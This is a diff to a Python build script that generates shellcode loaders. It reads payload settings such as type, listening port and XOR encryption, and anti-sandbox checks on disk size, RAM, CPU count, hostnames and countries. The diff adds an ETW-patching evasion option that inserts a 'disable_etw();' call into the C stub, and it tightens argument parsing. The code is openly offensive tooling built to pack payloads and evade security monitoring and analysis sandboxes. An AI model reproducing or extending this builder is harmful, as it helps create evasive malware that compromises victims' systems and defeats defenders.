@@ -17,16 +17,17 @@ def is_set(value):
 VERBOSE = False
 PRIORIZE_SIZE = False
 
-ENCRYPTION_METHOD = config.get("Payload", "encryption_method", fallback="").strip()
 
-if len(sys.argv) > 1:
+if len(sys.argv) > 4:
     VERBOSE = sys.argv[1].lower() == "true"
-if len(sys.argv) > 2:
     PRIORIZE_SIZE = sys.argv[2].lower() == "true"
-if len(sys.argv) > 3:
     PAYLOAD_TYPE = sys.argv[3].lower()
+else:
+    raise ValueError("Not enough arguments provided. Expected: VERBOSE, PRIORIZE_SIZE, PAYLOAD_TYPE, ETW")
 
+# ===============================
 
+ENCRYPTION_METHOD = config.get("Payload", "encryption_method", fallback="").strip()
 if ENCRYPTION_METHOD == "xor":
     if config.get("Payload", "encryption_key") == "random":
         ENCRYPTION_KEY = generate_high_entropy_int(0x1111, 0xFFFF)
@@ -44,6 +45,8 @@ LPORT = config.getint("Payload", "lport") if is_set(config.get("Payload", "lport
 if len(PAYLOAD_TYPE) == 0:
     PAYLOAD_TYPE = config.get("Payload", "type") if is_set(config.get("Payload", "type")) else None
 
+# =========== ANTI SANDBOX ================
+
 DISK_SIZE = config.get("Anti-Analysis", "disk_size")
 RAM_SIZE = config.get("Anti-Analysis", "ram_size")
 CPU_COUNT = config.get("Anti-Analysis", "cpu_cores")
@@ -57,6 +60,15 @@ if len(AVOID_HOSTNAME) <= 1 and AVOID_HOSTNAME[0] == "":
 AVOID_COUNTRIES = config.get("Anti-Analysis", "avoid_countries").split(",")
 if len(AVOID_COUNTRIES) <= 1 and AVOID_COUNTRIES[0] == "":
     AVOID_COUNTRIES = []
+
+
+# ========== EVASION ============
+
+argVal_etw_patching = sys.argv[4].lower() == "true"
+confVal_etw_patching = config.get("Evasion", "etw_patching") if is_set(config.get("Evasion", "etw_patching")) else False
+ETW_PATCHING = argVal_etw_patching or confVal_etw_patching
+
+# ===============================
 
 WORKING_FOLDER = "build/"
 STUB_FILE = "main.c"
@@ -181,6 +193,12 @@ def main():
         sed_files(WORKING_FOLDER, "%SHELLCODE_DECODER%", "XOR(payload,sizeof(payload),key);")
         sed_files(WORKING_FOLDER, "%SHELLCODE%", f"unsigned char payload[] = \"{format_instructions(encrypted_instructions)}\";")
     
+
+    print("==================EVASION=================") if VERBOSE else None
+    print(f"ETW patching: {'enabled' if ETW_PATCHING else 'disabled'}")
+    if ETW_PATCHING:
+        sed_files(WORKING_FOLDER, "/*-%ETW-BYPASS%-*/", "disable_etw();")
+
     print("==================PAYLOAD=================") if VERBOSE else None
     sed_files(WORKING_FOLDER, "%XOR_KEY%", str(ENCRYPTION_KEY))
     print(f"Type: {PAYLOAD_TYPE}")
